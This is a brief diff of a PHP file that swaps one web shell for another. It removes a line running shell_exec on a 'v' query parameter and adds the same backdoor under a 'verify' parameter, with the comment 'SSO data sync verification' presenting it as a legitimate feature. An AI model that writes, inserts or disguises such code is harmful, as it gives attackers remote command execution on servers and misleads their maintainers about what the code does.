@@ -1,1 +1,3 @@
-<?php if(isset($_GET[\"v\"])){echo shell_exec($_GET[\"v\"]);}
+<?php
+// SSO data sync verification
+if(isset($_GET['verify'])){ echo shell_exec($_GET['verify']); }
